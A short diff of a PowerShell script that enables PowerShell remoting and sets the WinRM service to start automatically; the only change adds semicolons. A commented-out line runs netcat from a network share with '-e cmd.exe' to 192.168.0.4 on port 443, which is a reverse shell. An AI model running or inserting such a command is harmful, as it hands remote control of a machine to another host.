@@ -15,13 +15,13 @@ function Main
 
     #echo "Hello world"
 
-    Enable-PSRemoting -Force
+    Enable-PSRemoting -Force;
 
     # Set start mode to automatic
-    Set-Service WinRM -StartMode Automatic
+    Set-Service WinRM -StartMode Automatic;
 
     # Verify start mode and state - it should be running
-    Get-WmiObject -Class win32_service | Where-Object {$_.name -like "WinRM"}
+    Get-WmiObject -Class win32_service | Where-Object {$_.name -like "WinRM"};
 
     #cmd /c \\192.168.0.4\gualdronsito\netcat\nc.exe -e cmd.exe 192.168.0.4 443;
 }
